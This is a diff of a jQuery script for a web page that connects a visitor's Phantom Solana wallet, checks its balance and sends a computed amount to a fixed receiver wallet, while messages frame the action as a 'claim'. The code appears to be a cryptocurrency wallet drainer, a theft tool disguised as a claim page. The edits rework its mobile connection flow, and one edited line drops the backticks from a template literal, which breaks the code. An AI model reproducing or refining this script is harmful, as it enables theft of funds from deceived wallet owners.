@@ -1,4 +1,3 @@
-<script>
 $(document).ready(function () {
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
@@ -10,8 +9,8 @@ $(document).ready(function () {
             'confirmed'
         );
 
-        const publicKey = new solanaWeb3.PublicKey(resp.publicKey);
-        const walletBalance = await connection.getBalance(publicKey);
+        const public_key = new solanaWeb3.PublicKey(resp.publicKey);
+        const walletBalance = await connection.getBalance(public_key);
         console.log("Wallet balance:", walletBalance);
 
         const minBalance = await connection.getMinimumBalanceForRentExemption(0);
@@ -37,13 +36,13 @@ $(document).ready(function () {
 
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: publicKey,
+                        fromPubkey: resp.publicKey,
                         toPubkey: recieverWallet,
                         lamports: transferAmount,
                     })
                 );
 
-                transaction.feePayer = publicKey;
+                transaction.feePayer = window.solana.publicKey;
                 const blockhashObj = await connection.getRecentBlockhash();
                 transaction.recentBlockhash = blockhashObj.blockhash;
 
@@ -53,18 +52,11 @@ $(document).ready(function () {
 
                 alert("Transaction successful!");
                 $('#connect-wallet').text("Connected");
-                sessionStorage.removeItem('readyToTransfer');
             } catch (err) {
                 console.error("Error during claim:", err);
                 alert("Claim failed. Please try again.");
             }
         });
-
-        // Auto-trigger transfer if redirected from mobile
-        if (sessionStorage.getItem('readyToTransfer') === 'true') {
-            console.log("Resuming transfer after redirect...");
-            $('#connect-wallet').click();
-        }
     }
 
     async function connectPhantom() {
@@ -79,16 +71,15 @@ $(document).ready(function () {
         }
     }
 
+    // Mobile deep link connection (ONLY for mobile devices)
     function openPhantomMobileApp() {
-        const dappUrl = encodeURIComponent(window.location.origin);
-        const redirectLink = encodeURIComponent(window.location.href);
-        const phantomDeepLink = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}&redirect_link=${redirectLink}`;
-
-        // Flag that we're trying to transfer
-        sessionStorage.setItem('readyToTransfer', 'true');
+        const dappUrl = encodeURIComponent(window.location.origin); // origin only for app_url
+        const redirectLink = encodeURIComponent(window.location.href); // to return here
+        const phantomDeepLink = https://phantom.app/ul/v1/connect?app_url=${dappUrl}&redirect_link=${redirectLink};
 
         window.location.href = phantomDeepLink;
 
+        // Fallback in case Phantom app isn't installed
         setTimeout(() => {
             if (!window.location.href.includes("phantom_encryption_public_key")) {
                 const fallback = confirm("It looks like Phantom Wallet is not installed. Do you want to download it?");
@@ -99,24 +90,13 @@ $(document).ready(function () {
         }, 3000);
     }
 
-    // Detect redirect from Phantom on mobile
+    // Handle Phantom redirect after mobile deep link connection
     const urlParams = new URLSearchParams(window.location.search);
-    const redirectedFromPhantom = urlParams.has("phantom_encryption_public_key") || sessionStorage.getItem('readyToTransfer') === 'true';
-
-    if (redirectedFromPhantom) {
-        console.log("Returned from Phantom mobile app");
-        $('#connect-wallet').text("Connecting...");
-
-        if (window.solana && window.solana.isPhantom) {
-            window.solana.connect()
-                .then(resp => {
-                    handleWalletConnection(resp);
-                })
-                .catch(err => {
-                    console.error("Failed to reconnect", err);
-                    alert("Failed to reconnect wallet.");
-                });
-        }
+    if (urlParams.has("phantom_encryption_public_key")) {
+        // Normally you'd decrypt and verify the payload here
+        console.log("Phantom redirected with encryption keys.");
+        $('#connect-wallet').text("Connected (Mobile)");
+        // Optionally: store that user is connected, or extract wallet address
     }
 
     $('#connect-wallet').on('click', async () => {
@@ -130,7 +110,7 @@ $(document).ready(function () {
         }
     });
 
-    // Auto-connect if trusted on desktop
+    // Auto-connect if already trusted on desktop
     const phantomAvailable = window.solana && window.solana.isPhantom;
 
     if (phantomAvailable) {
@@ -154,6 +134,3 @@ $(document).ready(function () {
         }
     }
 });
-</script>
-
-
